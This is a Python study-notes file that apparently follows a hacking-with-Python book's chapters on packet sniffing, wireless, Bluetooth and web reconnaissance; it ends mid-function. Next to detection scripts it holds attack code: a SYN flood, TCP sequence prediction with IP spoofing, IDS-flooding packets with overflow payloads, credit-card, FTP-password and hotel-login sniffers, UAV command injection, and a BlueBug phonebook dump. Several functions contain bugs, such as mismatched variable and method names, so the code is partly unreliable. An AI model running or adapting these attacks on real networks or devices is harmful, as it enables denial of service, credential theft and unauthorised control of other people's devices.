#####################################################################
# Chapter 4
#####################################################################

# Let's learn how to look at network traffic using python. We'll use some existing
# database which maps IP addresses to physical locations (just like we did with
# MAC addresses a couple chapters ago). For this one, we use the maxmind database
# with the pygeoip library.

def print_ip_location(ip):
    with geoip2.database.Reader('locations.mmdb') as gi:
        try:
            rec = gi.city(ip)
            city = rec.city.name
            country = rec.country.name

            if city != '':
                geoloc = city + ', ' + country
            else:
                geoloc = country

            return geoloc
        except:
            return 'unregistered'

# Using dpkt or scapy, we can look at network packets, and even take a look at each layer.


def print_pcap(pcap):
    for _, buf in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = inet_ntoa(ip.src)
            dst = inet_ntoa(ip.dst)
            print("[+] Src: {} ---> Dst: {}".format(src, dst))
            print(print_ip_location(src), print_ip_location(dst))
        except:
            pass


def pcap_main(pcap_file):
    with open(pcap_file, 'rb') as file:
        pcap = dpkt.pcap.Reader(file)
        print_pcap(pcap)

# To recap, you must get the pcap (hehe) file and pass it into the pcap_main function. Pcap
# is a capture of network activity, which can be done by the pypcap library. However, this
# library has bad documentation, so I decided to use the scapy library which I'd heard about.
# Using the sniff method, I downloaded all source and destination packets into a pcap file and
# passed it to the functions above which showed a list of packets being sent from my IP to
# whatever server of the website I was visiting during the sniff session. If the city wasn't
# listed in the maxmind database, it is listed as unregistered, otherwise it spits out the
# city and country of the server; since there is a lot of packets being sent to and fro
# my computer to servers, some IPs get repeated. For eg. 1.1.1.1 -> 2.2.2.2 and then
# 2.2.2.2 -> 1.1.1.1 i.e. the src and dest get switched on each request and response
# cycle (from what I understand).

# KML files are a format used to mark places on Google Earth (or something along those lines).
# What we can do now is use the IP address latitudes and longitudes and plot them on google
# earth to display them.


def return_kml(ip):
    try:
        with geoip2.database.Reader('locations.mmdb') as gi:
            rec = gi.city(ip)
            lat = rec.location.latitude
            long = rec.location.longitude
            kml = (
                '<Placemark>\n',
                f'<name>{ip}</name>',
                '<Point>\n'
                f'<coordinates>{lat},{long}</coordinates>\n'
                '</Point>\n'
                '</Placemark>\n'
            )

            return ''.join(kml)
    except:
        return ''


def plot_ips(pcap):
    kml_pts = ''
    for _, buf in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = inet_ntoa(ip.src)
            src_kml = return_kml(src)
            dst = inet_ntoa(ip.dst)
            dst_kml = return_kml(dst)
            kml_pts += src_kml + dst_kml
        except Exception as e:
            print(str(e))

    return kml_pts


# Read the pcap file, open using dpkt reader, and call the function,
# which loops through the pcap, parses the src and destination IPs,
# and appends the results to a KML style tuple.

# Let's talk about LOIC (Low Orbit Ion Cannon), which is a DOS attack
# toolkit; it fills the target with UDP/TCP traffic to overwhelm it.
# The anonymous group came up with this toolkit. Let's come up with a
# script which proves that a member downloaded and used it.

# This script will analyze HTTP traffic and check for GET requests for
# the LOIC zip file. Once again, we'll rely on the dpkt library which
# is proving to be very useful.

def find_loic_download(pcap):
    for _, buf in pcap:
        try:
            # Parsing through layers of networks i.e. ethernet, IP, TCP
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = inet_ntoa(ip.src)
            tcp = ip.data
            http = dpkt.http.Request(tcp.data)

            if http.method == 'GET':
                uri = http.uri.lower()
                if '.zip' in uri and 'loic' in uri:
                    print('[!] {} downloaded LOIC'.format(src))
                else:
                    print('[+] {} is clean'.format(src))
        except:
            pass


# Using a pcap file to find a connection to HIVEMIND
def find_hivemand(pcap):
    for _, buf in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = inet_ntoa(ip.src)
            dst = inet_ntoa(ip.dst)
            tcp = ip.data

            # destination and source tcp ports
            dport = tcp.dport
            sport = tcp.sport

            # We know that HIVEMIND uses port 6667
            if dport == 6667:
                if '!lazor' in tcp.data.lower():
                    print("[!] DDoS Hivemind issued by {}".format(src))
                    print("[+] Target command: {}".format(tcp.data))
            if sport == 6667:
                if '!lazor' in tcp.data.lower():
                    print("[!] DDoS Hivemind issued by {}".format(dst))
                    print("[+] Target command: {}".format(tcp.data))
        except:
            pass


# How can you identity DDoS attacks? The attacker fires a massive amount
# of TCP packets to a target. If we see a certain number of packets being
# sent every fraction of a second or something, that's when we know that
# something funky is going on. Usually, targets have a tough time even
# acknowledging most of these packets.
ATTACK_THRESHOLD = 10000


def find_attack(pcap):
    packet_count = {}

    for _, buf in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = inet_ntoa(ip.src)
            dst = inet_ntoa(ip.dst)
            tcp = ip.data
            dport = tcp.dport

            if dport == 80:
                stream = src + ":" + dst
                if stream in packet_count:
                    packet_count[stream] += 1
                else:
                    packet_count[stream] = 1
        except:
            pass

    for stream in packet_count:
        packets = packet_count[stream]
        if packets > ATTACK_THRESHOLD:
            src, dst = stream.split(":")
            print(
                "[+] Src {} attacked dst {} with {} packets".format(src, dst, str(packets)))

# Back when nmap was just released, the Pentagon actually faced several threats as a result of the
# tool's usage. H.D Moore, as a teenager, conjectured that the TTL (time to live) field would be
# useful in determining which attacks were real and which were decoys.
# When a computer sends an IP packet, it sets the field as an upper bound of how many hops it
# can take before reaching the destination. Each routing device touched by the packet decrements
# this value.

# Remember to always run any scapy code with root user privileges AKA sudo


def test_ttl(packet):
    try:
        if packet.haslayer(IP):
            ipsrc = packet.getlayer(IP).src
            ttl = str(packet.ttl)
            print("[+] Packet received from {} with TTL {}".format(ipsrc, ttl))
    except:
        pass


def test_ttl_main():
    sniff(prn=test_ttl, store=0)


ttl_values = {}
HOP_THRESHOLD = 5


def check_received_ttl_versus_actual(ipsrc, ttl):
    if IPTEST(ipsrc).iptype == 'PRIVATE':
        return

    # If we haven't seen this IP address, build a packet with destination address equal
    # to source. Send an ICMP echo request so the destination has to respond. Once we
    # get it, set the TTL value from the packet.
    if ipsrc not in ttl_values:
        pck = sr1(IP(dst=ipsrc) / ICMP(),
                  retry=0, timeout=1, verbose=0)

        ttl_values[ipsrc] = pck.ttl

    if abs(int(ttl) - int(ttl_values[ipsrc]) > 5):
        print("[!] Detected possible spoofed packet from {}".format(ipsrc))
        print("[!] Received TIL: {}, Actual TIL: {}".format(
            ttl, ttl_values[ipsrc]))

# Linux by default has a TIL of 64 and windows has one of 128, which is why a TIL of 13
# draws red flags. By now, nmap has probably fixed this error in decoy network scans, which
# is why it important to understand where vulnerabilities lie in systems and tools.

# The fast-flux technique used by the infamous storm botnet. DNS translates domain names
# to IP addresses (DNS servers also output a TIL value until which the IP address remains
# valid for). The attackers swapped IP addresses frequently and made sure there was a low
# TIL value for validity at a glance. The conflicker attack created 50000 domain names every
# 3 hours or so and used only a handful for the attacks (aptly named fast-flux for this
# reason). Let's write a fast-flux detector.

# In Scapy, a DNSQR contains qname, qtype, and qclass questions. The function works by adding
# IP addresses to a dictionary, peeling a layer, and checking if the next IP exists; the process
# is repeated until we find a number of unique IP addresses for the same domain.


dns_record = {}


def handle_packet(packet):
    if packet.haslayer(DNSRR):
        rrname = packet.getlayer(DNSRR).rrname
        rdata = packet.getlayer(DNSRR).rdata

        if rrname in dns_record:
            if rdata not in dns_record[rrname]:
                dns_record[rrname].append(rdata)
        else:
            dns_record[rrname] = []
            dns_record[rrname].append(rdata)


def check_domain_ips():
    pkts = open('fastFlux.pcap')
    for pkt in pkts:
        handle_packet(pkt)

    for item in dns_record:
        print("[+] {} has {} unique IPs".format(item, str(len(dns_record[item]))))

# Most DNS servers lacked the ability to translate domain names to actual addresses, so
# they generated error codes instead. Let's check errors for these failures.


def dns_error_check(packet):
    # Port 53 contains resource records. if rcode equals 3, that is an
    # error
    if packet.haslayer(DNSRR) and packet.getlayer(UDP).sport == 53:
        rcode = packet.getlayer(DNS).rcode
        qname = packet.getlayer(DNSQR).qname

        if rcode == 3:
            print("[!] Name request lookup failed: {}".format(qname))
            return True
        else:
            return False

# Recreating the TCP sequence prediction + IP spoofing vector
# The attack went like this:
# 1. find a server that the machine trusts
# 2. silence that server
# 3. spoof a connection from that server
# 4. spoof an acknowledgement of the TCP three-way handshake
#
# All this sounds more complicated than it really is. As always, the
# toughest part is the theory and creativity in the attacks: the code
# is easy! The silcening was done by a SYN flood, which keeps the server
# from responding.


def syn_flood(src, tgt):
    for sport in range(1024, 65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        scapy.sendrecv.send(pkt)


# An SYN is a TCP packet requesting connection to the server. For the attack, the
# attacker needs a TCP sequence, which he tries to get via SYN requests. Modern OS's
# have a more random TCP sequences, but that wasn't the case during the attack. This
# function will send SYN's and wait for SYN-ACK responses.

def calc_tsn(tgt):
    seq_num = 0
    pre_num = 0
    diff_seq = 0

    for x in range(1, 5):
        if pre_num != 0:
            pre_num = seq_num

        pkt = IP(dst=tgt) / TCP()
        ans = sr1(pkt, verbose=0)

        # get the TCP layer and strip out the seq number
        seq_num = ans.getlayer(TCP).seq
        diff_seq = seq_num - pre_num
        print("[+] TCP Seq Diff: {}".format(diff_seq))

    return seq_num + diff_seq

# If there's no TCP sequence randomization, the target suffers
# from this vulnerability. The next step is to spoof a connection
# from the silenced server.


def spoof_conn(src, tft, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    syn_pkt = IPlayer / TCPlayer
    send(syn_pkt)

    # Acknowledgement packet
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    ack_pkt = IPlayer / TCPlayer
    send(ack_pkt)

# Network based intrusion detection systems can log packets
# and network traffic real time. What if you send out many
# different attacks to overwhelm the analyst? For cetain
# attacks, we craft certain packets with different contents.

# Crafting 4 packets with 4 different types of attacks


def ddos_test(src, dst, iface, count):
    pkt = IP(src=src, dst=dst)/ICMP(type=8, id=678)/Raw(load='1234')
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src, dst=dst)/ICMP(type=0)/Raw(load='AAAAAAAAAA')
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src, dst=dst)/UDP(dport=31335)/Raw(load='P0NG')
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src, dst=dst)/ICMP(type=0, id=678)
    send(pkt, iface=iface, count=count)

# For a different attack AKA the ntalkd x86 Linux overflow and the
# Linux mountd overflow, we require crafting bytes into the attack
# load.


def exploit_test(src, dst, iface, count):
    pkt = IP(src=src, dst=dst)/UDP(dport=518) \
        / Raw(load='"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src, dst=dst)/ICMP(type=0)\
        / Raw(load='^\xB0\x02\x89\x06\xFE\xC8\x89\x04\xB0\x06\x89F')
    send(pkt, iface=iface, count=count)


def scan_test(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=7) \
        / Raw(load='Amanda')
    send(pkt, iface=iface, count=count)

#####################################################################
# Chapter 5
#####################################################################

# This wireless attack requires some hardware, so it'll be ignored, but
# I will list out what exactly this does. There's a wireless network
# adapter in use which sends raw 802.11 frames. To place the card into
# listening mode, use the aircrack-ng suite. For each packet encountered,
# we'll run this function below.


def print_pkt(pkt):
    if pkt.haslayer(Dot11Beacon):
        print("[+] Detected 802.11 Beacon Frame")
    elif pkt.haslayer(Dot11ProbeReq):
        print("[+] Detected 802.11 Probe Request Frame")
    elif pkt.haslayer(TCP):
        print("[+] Detected a TCP packet")
    elif pkt.haslayer(DNS):
        print("[+] Detected a DNS packet")

# Python can be used to attack Bluetooth as well. We can use the
# Bluez API and the obexftp API. Let's do a quick regex review
# for credit cards.
#
# . - any character
# [ab] - match or b
# [0-9] = match any digit
# ^ - start of string
# * - 0 or more
# + - 1 or more repititions
# ? - 0 or 1 repititions
# {n} - n copies of previous regex

# Let's write regexes for visa, mastercard, and american express.


def find_american_express(raw):
    americaRE = re.findall("3[47][0-9]{13}", raw)
    if americaRE:
        print("[+] Found American Express Card: {}".format(americaRE[0]))


def find_master_card(raw):
    masterRE = re.findall("5[1-5][0-9]{14}", raw)
    if masterRE:
        print("[+] Found American Express Card: {}".format(masterRE[0]))


def find_visa_card(raw):
    # start with 4 + 12 digits and accept 0 or 1 cases of 3 or more digits
    visaRE = re.findall("4[0-9]{12}(?:[0-9]{3})?", raw)
    if visaRE:
        print("[+] Found American Express Card: {}".format(visaRE[0]))

# How the credit card sniffer works is to set the card in monitor mode,
# sniff the wireless packets, and check for these regexes.
# For the scapy side of things, you can call the sniff function, with a
# tcp filter i.e. sniff(filter='tcp', prn=function, store=0)

# There are many unencrypted wireless networks in airports, hotels,
# cafes, etc. This can be exploited. The example given in the book is
# awesome: the hotel in question took last name and room number as
# authentication for WiFi AND for meals, drinks, cigars, and, well,
# you name it. This information can be sniffed out as other guests try
# to log into this WiFi.

# conf.iface = "mon0", is the code which sets the interface
# Then we sniff for tcp packets. Packets contain all sorts of
# garbage, so getting skilled with regexes is a good idea.


def find_guest(pkt):
    raw = pkt.sprintf("%Raw.load%")

    # The ?i is for matching any case insensitive character
    # ?-i turns off case insensitive mode
    name = re.findall("(?i)LAST_NAME=(.*)&", raw)
    room = re.findall("(?i)ROOM_NUMBER=(.*)'", raw)
    if name:
        print("[+] Found hotel guest {} with Room #{}".format(name[0], room[0]))

# Google most likely implements a HTTP GET request after every
# keystroke, which can be sniffed out. A google search includes
# q= as the query parameter (pq for previous search).


def find_google(pkt):
    if pkt.haslayer(Raw):
        payload = pkt.getlayer(Raw).load

        if b'GET' in payload:
            if b'google' in payload:
                payload_str = payload.decode("utf-8")
                print(payload_str)
                r = re.findall(r'(?i)\&q=(.*?)\&', payload)
                if r:
                    search = r[0].split('&')[0]
                    search = search.replace('q=', '').\
                        replace('+', ' ').replace('%20', ' ')
                    print("[+] Searched for: {}".format(search))
                else:
                    print("[-] Something went wrong")
            else:
                print("[-] {} not in payload".format(b'google'))


# Although this was working sometimes, it was very inconsistent (probably
# because of encrypted wireless network).

# As we've seen, sniffing is a very powerful mechanism and is very dangerous.
# It can be also used to acquire FTP credentials. When a person logs into a
# service, an attacker can listen and intercept these credentials if they're
# trasmitted over a wireless network. Scapy contains the load field which can
# catch these credentials.

def ftp_sniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf("%Raw.load%")
    user = re.findall("(?i)USER (.*)", raw)
    password = re.findall("(?i)PASS (.*)", raw)

    if user:
        print("[+] FTP login to {} from user {}".format(str(dest), str(user[0])))
    elif password:
        print("[+] Password: {}".format(str(password[0])))


# Scapy works in conjunction with network interfaces. You can also
# sniff out where certain laptops have been aka the wifi networks
# they connect to. Phones and laptops have lists of WiFis that they
# have connected to in the past. Computers send 802s after either
# booting up or disconnecting from a network.

saved_wifis = []


def sniff_probe(pkt):
    if pkt.haslayer(DOT11ProbeReq):
        net_name = pkt.getlayer(DOT11ProbeReq).info
        if net_name not in saved_wifis:
            saved_wifis.append(net_name)
            print("[+] Detected new probe request: {}".format(net_name))

# Some networks hide their SSID's to avoid having it be discovered.
# Usually 802.11 Beacon Frames contain the name of the network, but
# on networks which have their ID's hidden, this field is left blank.


hidden_networks = []
unhidden_networks = []


def sniff_dot_11(p):
    if p.haslayer(Dot11Beacon).info == '':
        addr2 = p.getlayer(Dot11).addr2
        if addr2 not in hidden_networks:
            print("[-] Hidden SSID with mac: {}".format(addr2))
            hidden_networks.append(addr2)

    if p.haslayer(DOT11ProbeResp):
        addr2 = p.getlayer(Dot11).addr2
        if (addr2 in hidden_networks) & (addr2 not in unhidden_networks):
            net_name = p.getlayer(Dot11ProbeResp).info
            print("[+] Decloaked Hidden SSID: {} for MAC: {}".format(net_name, addr2))

# We know the mac address of the access points, but still we don't know
# anything about the SSID name. To discover the hidden names, we must
# wait for probe responses which match the earlier mac address.
# It's crazy to think that even UAV's can be intercepted using python. In
# fact, there's was such an attack on a US UAV with $26 apparatus years
# ago! The first step is to get a wireless adapter in monitor mode. A
# paired iphone can send instructions to the UAV, yet the only security
# mechanism protecting this connection is MAC filtering (the MAC address
# assigned to each network card is used to determine access to the network). Using a
# tcpdump, we see some UDP traffic coming into the Iphone (from the UAV I guess) on
# a port. There's another set of data going from the Iphone to the UAV. Bingo.


NAVPORT = 5556


def print_packet(pkt):
    if pkt.haslayer(UDP) and pkt.getlayer(UDP).dport == NAVPORT:
        raw = pkt.sprintf("%RAW.load%")
        print(raw)

# The author ran this script to monitor the UAV traffic for a long time to see trends
# (so you want to be a hacker huh?), and found several trends, such as one for landing
# the plane, controlling its motion, etc.


EMER = '290717952'
TAKEOFF = '290718208'


class InterceptThread(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.cur_pkt = None
        self.seq = 0
        self.foundUAV = False

    def run(self):
        sniff(prn=self.intercept_pkt, filter='udp port 5556')

    def intercept_pkt(self, pkt):
        if self.foundUAV == False:
            print("[*] UAV found")
            self.foundUAV = True
        self.cur_pkt = pkt
        raw = self.cur_pkt.sprintf("%Raw.load%")

        try:
            # Apparently the sequence number is held in the first sentence before the comma and the last element after
            # the series of = signs. + 5. This is the format listed in the book:
            # AT*CMD*=SEQUENCE_NUMBER,VALUE,[VALUE{3}].
            self.seq = int(raw.split(',')[0].split('=')[-1]) + 5
        except:
            self.seq = 0

    def inject_command(self, cmd):
        ''' What's going on here? Let's assume we got the dup library (which you can take a look at in the book's code).
        This is duplicating the current packet at each of the radio, dot11, .. layers. It then adds the command as the
        payload of the udp layer, forges all the other layers together, and sends the packet off. Simple!!!'''

        radio = dup.dupRadio(self.cur_plt)
        dot11 = dup.dupDot11(self.cur_plt)
        snap = dup.dupSNAP(self.cur_plt)
        llc = dup.dupLLC(self.cur_plt)
        ip = dup.dupIP(self.cur_plt)
        udp = dup.dupUDP(self.cur_plt)
        raw = Raw(load=cmd)
        injectPkt = radio / dot11 / llc / snap / ip / udp / raw
        sendp(injectPkt)

    def emergencyland(self):
        ''' Spoof a sequence and run the command '''
        spoofSeq = self.seq + 100
        watch = 'AT*COMWDG=%i\r' % spoofSeq
        toCmd = 'AT*REF=%i,%s\r' % (spoofSeq + 1, EMER)
        self.injectCmd(watch)
        self.injectCmd(toCmd)

    def takeoff(self):
        spoofSeq = self.seq + 100
        watch = 'AT*COMWDG=%i\r' % spoofSeq
        toCmd = 'AT*REF=%i,%s\r' % (spoofSeq + 1, TAKEOFF)
        self.injectCmd(watch)
        self.injectCmd(toCmd)

# We got the sequence number we need, so we can craft our own packets to send to the drone now. Here comes the
# reason why we saved the current packet. We need to duplicate a lot of information from the original packet
# itself, and we need to be careful to copy each layer. Scapy makes it easy for us to understand each field
# in layers, by doing a ls(layer_name).

# For the Dot11 layer -
# subtype    : BitMultiEnumField                   = ('0')
# type       : BitEnumField                        = ('0')
# proto      : BitField  (2 bits)                  = ('0')
# cfe        : BitEnumField (Cond)                 = ('0')
# FCfield    : MultipleTypeField (FlagsField, FlagsField) = ('<Flag 0 ()>')
# ID         : ShortField                          = ('0')
# addr1      : _Dot11MacField                      = ("'00:00:00:00:00:00'")
# addr2      : _Dot11MacField (Cond)               = ("'00:00:00:00:00:00'")
# addr3      : _Dot11MacField (Cond)               = ("'00:00:00:00:00:00'")
# SC         : LEShortField (Cond)                 = ('0')
# addr4      : _Dot11MacField (Cond)               = ("'00:00:00:00:00:00'")

# We can leave out some fields, such as the IP field as each command may have a different length. There's
# a lot of code for this part, which is pretty darn similar, so I am not going to bother writing it down,
# but it is pretty interesting to read! Using our functions, we can inject commands into the drone/UAV
# using the current packet.

# The fireship tool passively listened to wireless card for HTTP cookies. When an insecure wireless network
# was encountered, the fireship tool intercepted these cookies, which is disasterous because most session
# control in the web is done via cookies or tokens. Everything about these requests are the same, excpet
# the user agent perhaps and definitely the IP address. So how would you check this kind of cookie reuse?
# Check the IP address! Use scapy to spit out the IP layer.


def fire_catcher(pkt):
    raw = pkt.sprintf("%Raw.load%")
    r = re.findall('wordpress_[0-9a-fA-F]{32}', raw)
    cookie_table = {}

    # If there's a Set in a cookie, it was just set and thus is obviously not being reused
    # This will print a bunch of src, dst, and cookies from the network being sniffed. If
    # any two IPs have the same cookie, we know one of them is an attacker. To know which
    # one's which, we can implement a dictionary to raise an error if there's a common key.

    if r and 'Set' not in r:
        if r[0] not in cookie_table.keys():
            cookie_table[r[0]] = pkt.getlayer(IP).src
        elif cookie_table[r[0]] != pkt.getlayer(IP).src:
            print("[!] Detected a cookie reuse attack!")
            print("Victim={}".format(cookie_table[r[0]]))
            print("Attacker={}".format(pkt.getlayer(IP).src))


# We've seen the power of sniffing networks and parsing packets. Now we can proceed to attacking
# bluetooth devices. Using the PyBluez library, we can call functions like discover_devices to
# list out the MAC addresses of devices nearby. The library also has a function to convert the
# address to a human readable string.

already_found = []


def find_devices():
    nearby_devices = discover_devices(lookup_names=True)
    for addr, name in nearby_devices:
        if addr not in already_found:
            already_found.append(addr)
            print("  {} - {}".format(addr, name))

# This only finds bluetooth devices with mode set to discoverable.
#     "Let’s consider a trick to target the iPhone’s Bluetooth radio in hidden mode.
#     Adding 1 to the MAC address of the 802.11 Wireless Radio identifies the Bluetooth Radio MAC
#     address for the iPhone"
# We will sniff for the 802.11 Wireless Radio which is doable because it doesn't protect its
# MAC address through layer-2 controls. The first three bytes of a MAC address is the OUI
# i.e. Organizational Unique Identifier. It's crazy how much information is out there on the
# internet because there are actually databases which list of these manufacturers with OUIs.
# Checking my own device's address, I saw that the first three bytes does list the manufacturer.
# Let's listen for a device with this MAC address, so we can find the MAC address of the 802.11
# radio.


def wifi_print(pkt):
    iphone_oui = '88:B2:91'
    if pkt.haslayer(Dot11):
        wifi_mac = pkt.getlayer(Dot11).addr2

        # If the OUI matches the first 8 characters of the address string
        if iphone_oui == wifi_mac[:8]:
            print("[*] Detected iphone radio mac: {}".format(wifi_mac))

# Using the MAC address of the wireless radio, we will now construct MAC address
# of the bluetooth radio. To reiterate, we had to go this long route because this
# particular bluetooth device is cloaked.


def return_bt_address(addr):

    # The second number in the constructor specifies a base. Add 1, convert it to hex, and remove the 0x part
    # Add the colons after every two characters
    bt_addr = str(hex(int(addr.replace(':', ''), 16) + 1))[2:]
    bt_addr = bt_addr[0:2]+":"+bt_addr[2:4]+":"+bt_addr[4:6]+":" +\
        bt_addr[6:8]+":"+bt_addr[8:10]+":"+bt_addr[10:12]
    return bt_addr

# The rationale is that, even in hidden mode, the device still responds to a device name inquiry.
# Let's talk about a bluetooth vulnerability in the RFCOMM channel. This channel emulates RS232
# serial ports over the bluetooth L2CAP protocol. Now what does this mean in English? THe
# RS232 port used to be how computers connected to printers, telephone modems, and the like.
# (this has since been replaced by USB cable). L2CAP is a protocol used in bluetooth, and the
# RFCOMM channel is built upon the former.

# Usually RFCOMM can encrypt connections, some manufacturers forget to do so. To make a RFCOMM
# connection, we can create a RFCOMM type socket.


def rfcomm_conn(addr, port):
    sock = BluetoothSocket(RFCOMM)
    try:
        sock.connect((addr, port))
        print("[+] RFCOMM Port: {} open".format(str(port)))
        sock.close()
    except:
        print("Port's closed homie")

# The bluetooth service discovery protocol - enumerates types of profiles and services offered by
# bluetooth devices. If you pass the function below a MAC address, it lists out the services
# given by it on the port.


def sdp_browse(addr):
    services = find_service(address=addr)
    for service in services:
        name = service['name']
        protocol = service['protocol']
        port = str(service['port'])
        print("[+] Found {} with protocol {} on port #{}".format(name, protocol, port))

# In the book, the author finds a printer with offers OBEX object push profile on RFCOMM
# port 2. This is akin to anonymous FTP to the printer, which gives control to it, if you
# know where to look. Let's try to get the printer to print a photo of a ninja.
# Pro tip: Writing frequent log messages while coding is a very helpful investment. Also,
# this was easy! The tough part was actually determining what services the printer offered
# and how.


def print_ninja():
    try:
        bt_printer = obexftp.client(obexftp.BLUETOOTH)
        bt_printer.connect('00:16:38:DE:AD:11', 2)
        bt_printer.put_file('/tmp/ninja.jpeg')
    except:
        print("[-] Failed to print the ninja")

# The BlueBug attack - using RFCOMM channels yet again. In past firmwares of phones, this
# channel required no authentication, so an attacker could willy nilly connect to it. The
# book states that AT commands are used, which different from cronjobs in the sense that
# cronjobs are reoccuring while AT commands run once in the future.
#
# Hold up, the book may very well be discussing a different sort of AT command (I presumed it
# to be Linux's at command), but the book states that a simple AT+CPBR = 1 means the first
# contact in the phonebook o.O. Yep, the book is talking about the Hayes command set, used to
# dial, hangup, etc.


def blue_bug_attack():
    target_phone = "AA:BB:CC:DD:EE:FF"
    port = 17
    phone_sock = BluetoothSocket(RFCOMM)
    phone_sock.connect((target_phone, port))
    for contact in range(1, 5):
        at_cmd = f"AT+CPBR={str(contact)}\n"
        phone_sock.send(at_cmd)
        response = phone_sock.recv(1024)
        print("[+] {}: {}".format(str(contact), response))

# This will dump the first five contacts from a phone's phonebook. Moral of the story: a lot
# can be done with MAC addresses, port scanning, and python. Beware!

#####################################################################
# Chapter 6
#####################################################################


def view_page(url):
    browser = mechanize.Browser()
    page = browser.open(url)
    source_code = page.read()
    print(source_code)

# You've done quite a lot of web scraping on the internet, so maybe now's the time to explore
# more about how to stay anonymous while doing these escapades. This is because using the requests
# library is no different to going to the browser yourself and doing whatever it is you're doing.
# How do you hide yourself? First of all, you should know how the web tracks you. Whenever you
# make a request to a server, it logs your IP address. This can be solved by the use of VPNs or
# proxies. Let's begin here. You can pass proxies to the requests module pretty easily by giving
# it a dictionary.


def test_proxy(url, proxy):
    browser = mechanize.Browser()
    print("[!] Opened the browser")
    browser.set_proxies(proxy)
    print("[!] Set the proxies")
    page = browser.open(url)
    print("[!] Opened the URL")
    source_code = page.read()
    print(source_code)

# Another way to determine the machine is the User-Agent header in requests. HAHAHA, recently
# a scandal arose where a travel agency website found macbook users through user agents and gave
# them more expensive options. And, to no surprise, there's actually a website (useragentstring.com
# or something along those lines), which you can use to pass in custom user agents.

# Finally, cookies are another way web servers determine some interesting information about clients.
# Let's use the cookielib standard library to see what's up (this has been changed to http.cookiejar in
# python3x, so check out the differences).


def print_cookies(url):
    browser = mechanize.Browser()
    cookie_jar = cookielib.LWPCookieJar()
    browser.set_cookiejar(cookie_jar)
    _ = browser.open(url)

    for cookie in cookie_jar:
        print(cookie)

# Now the book proceeds into discussing beautifulsoup. One thing you need to remember is that there's no
# anonymity if an API requires an API key, unless you get those from somewhere else too.

# Now the book goes into writing a class to hold big json responses like these in an easier
# format for effective use, which is good to practice. It can be as simple as you like!


class Google_Result:
    def __init__(self, title, text, url):
        self.title = title
        self.text = text
        self.url = url

    # Once again, creating this class changes the string representation of this class
    def __repr__(self):
        return self.title

# This API is no longer working, but you get the gist of what it's doing. More importantly, check out the
# sort of functions at use here, especially stuff like urllibb.parse's quote_plus, which takes a string
# and adds plus's to spaces, which is required for a google query.


def make_json(search_term):
    br = mechanize.Browser()
    search_term = urllib.parse.quote_plus(search_term)
    response = br.open(('http://ajax.googleapis.com/' +
                        'ajax/services/search/web?v=1.0&q=' + search_term))
    objects = json.load(response)
    results = []

    for result in objects['responseData']['results']:
        url = result['url']
        title = result['titleNoFormatting']
        text = result['content']
        new_gr = Google_Result(title, text, url)
        results.append(new_gr)

    return results


class ReconPerson:
    def __init__(self, first_name, last_name, job='', social_media={}):
        self.first_name = first_name
        self.last_name = last_name
        self.job = job
        self.social_media = social_media

    def __repr__(self):
        return self.first_name + ' ' + \
            self.last_name + ' has job ' + self.job

    def get_social(self, media_name):
        if media_name in self.social_media.keys():
            return self.social_media[media_name]

        return None

    def query_twitter(self, query):
        query = urllib.parse.quote_plus(query)
        results = []
        browser = mechanize.Browser()
        response = browser.open(
            'http://search.twitter.com/search.json?q=' + query)
        json_objects = json.load(response)

        for result in json_objects['results']:
            new_result = {}
            new_result['from_user'] = result['from_user_name']
            new_result['geo'] = result['geo']
            new_result['tweet'] = result['text']
            results.append(new_result)

# This much was peanuts to the experienced coder, so let's get into something more exciting.
# Location data.

# We're using the cities file from which we get a big selection of cities.


def load_cities(city_file):
    cities = []

    for line in open(city_file).readlines():
        city = line.strip('\n').strip('\r').lower()
        cities.append(city)
        return cities

# What this function basically is doing is that it's checking whether the 'geo' geolocation key exists in
# tweet text.


def twitter_locate(tweets, cities):
    locations = []
    loc_cnt = 0
    city_cnt = 0
    tweets_txt = ""

    for tweet in tweets:
        if tweet['geo']:
            locations.append(tweet['geo'])
            loc_cnt += 1
            tweets_txt += tweet['tweet'].lower()

    for city in cities:
        if city in tweets_txt:
            locations.append(city)
            city_cnt += 1

    print("[+] Found {} locations via Twitter API and {} "
          "locations from text search.".format(str(loc_cnt), str(loc_cnt)))

    return locations

# Points of interest for Twitter users (or any website for that matter) is a
# good target for a social engineering attack. Links, mentions, etc, everything is
# fair game.


def find_interests(tweets):
    interests = {}
    interests['links'] = []
    interests['users'] = []
    interests['hashtags'] = []

    for tweet in tweets:
        text = tweet['tweet']

        # \Z matches at the end
        links = re.compile('(http.*?)\Z|(http.*?) ')\
            .findall(text)

        for link in links:
            if link[0]:
                link = link[0]
            elif link[1]:
                link = link[1]
            else:
                continue

            try:
                # Saving a link only after using urlopen because links are
                # often shortened in Twitter due to the character limit

                response = urllib.request.urlopen(link)
                full_link = response.url
                interests['link'].append(full_link)
            except:
                pass

        # w is a regex metacharacter which matches for a word. Regexes
        # have many mechanisms for matching which you don't know about!

        interests['users'] += re.compile('(@\w+)').findall(text)
        interests['hashtags'] += re.compile('(#\w+)').findall(text)

    interests['users'].sort()
    interests['hashtags'].sort()
    interests['links'].sort()
    return interests

# Crazy to think that there exist disposable email addresses, which can
# terminate after 10 minutes even. Sending emails is an easy process using
# the smtplib library.

# MIME = multipurpose internet mail extensions


def send_email(user, password, to, subject, text):
    msg = MIMEText(text)
    msg['From'] = user
    msg['To'] = to
    msg['Subject'] = subject
    try:
        smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
        print("[+] Connecting to mail server")
